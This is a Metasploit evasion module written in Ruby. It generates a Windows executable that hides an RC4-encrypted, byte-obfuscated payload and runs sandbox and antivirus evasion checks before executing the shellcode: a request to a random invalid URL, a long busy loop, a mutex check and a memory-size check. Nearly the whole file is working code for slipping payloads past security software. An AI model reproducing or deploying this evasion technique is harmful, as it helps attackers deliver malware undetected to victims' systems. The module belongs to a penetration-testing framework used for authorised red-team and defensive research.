##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'metasploit/framework/compiler/windows'

class MetasploitModule < Msf::Evasion

  def initialize(info={})
    super(merge_info(info,
      'Name'        => 'No shellcode defined, to reduce detection ratio',
      'Description' => %q{
        This module allows you to generate a Windows EXE without having a large shellcode in the file. and rather have it generated at runtime. This is useful for reducing the detection ratio of your payload.
        it will also use few technique to avoid runtime detection such as, 
        opening non existing files,
        querying time from a distant server->sleep->query time again.
        calling api function that are not fully emulated by avs.
       },
      'Author'      => [ 'Arthur RAOUT' ],
      'License'     => MSF_LICENSE,
      'Platform'    => 'win',
      'Arch'        => ARCH_X86,
      'Targets'     => [ ['Microsoft Windows', {}] ]
    ))
  end

  def rc4_key
    @rc4_key ||= Rex::Text.rand_text_alpha(32..64)
  end


  def get_payload
    @c_payload ||= lambda {
      opts = { format: 'rc4', key: rc4_key }
      junk = Rex::Text.rand_text(10..1024)
      p = payload.encoded + junk

      return {
        size: p.length,
        hex_format: Msf::Simple::Buffer.transform(p, 'hex', 'buf', opts),
        c_format: Msf::Simple::Buffer.transform(p, 'c', 'buf', opts)
      }
    }.call
  end
def get_payload_bytes()
  payload = get_payload[:hex_format]
  s = ""
  i = 0
  j = 0
  vector = rand(1..1024)
  while j < get_payload[:size]
    s += "  buf[#{j}] = \'\\x#{((payload[i]+payload[i+1]).hex + vector).to_s(16).rjust(2, "0")}\'-#{vector};\n"
    i = i+2
    j = j+1
  end
  return s
end

  def c_template
    @c_template ||= %Q|
#include <windows.h>
#include <psapi.h>
#include <wininet.h>
#pragma comment(lib, "Psapi.lib")
#pragma comment(lib, "Wininet.lib")

// The encrypted code allows us to get around static scanning

int size  = #{get_payload[:size]};
char *buf[#{get_payload[:size]}];

#define max_op #{rand(100000000..500000000)}

int check_url()
{
  char cononstart[] = "https://www.#{Rex::Text.rand_text_alpha(rand(10..20))}.com"; //Invalid URL
  char readbuf[1024];
  HINTERNET httpopen, openurl;
  DWORD read;
  httpopen=InternetOpen(NULL,INTERNET_OPEN_TYPE_DIRECT,NULL,NULL,0);
  openurl=InternetOpenUrl(httpopen,cononstart,NULL,NULL,INTERNET_FLAG_RELOAD\|INTERNET_FLAG_NO_CACHE_WRITE,NULL);
  if (!openurl) // Access failed, we are not in AV
  {
    InternetCloseHandle(httpopen);
    InternetCloseHandle(openurl);
    return 1;
  }
  else
  {
    InternetCloseHandle(httpopen);
    InternetCloseHandle(openurl);
    return 0;
  }
  return 0;
}


int main(int argc, char **argv)
{

  if (!check_url())
    exit(1);
  #{get_payload_bytes}
  int cpt = 0;
  int i = 0;
  for (i = 0; i < max_op; i++) {
    cpt++;
  }
  if (cpt == max_op) {
    HANDLE mutex;
    mutex = CreateMutex(NULL, TRUE, "#{Rex::Text.rand_text_alpha(5)}");
    if (GetLastError() == ERROR_ALREADY_EXISTS)
    {
      ;
    }
    else
    {

      exit(0);
    }
    PROCESS_MEMORY_COUNTERS pmc;
    GetProcessMemoryInfo(GetCurrentProcess(), &pmc, sizeof(pmc));
    if(!(pmc.WorkingSetSize<=3500000))
    {
      exit(#{rand(1..255)});
    }
    // Checking NULL allows us to get around Real-time protection
    void (*func)();
    func = (void (*)()) buf;
    (void)(*func)();
    return 0;
  }
}|
  end

  def run
    # The randomized code allows us to generate a unique EXE
    m = Metasploit::Framework::Compiler::Mingw::X86.new({ show_compile_cmd: true, f_name: "OK", compile_options: " -lpsapi -lwininet " })
    bin = m.compile_c(c_template)
    print_status("Compiled executable size: #{bin.length}")
    file_create(bin)
  end
end
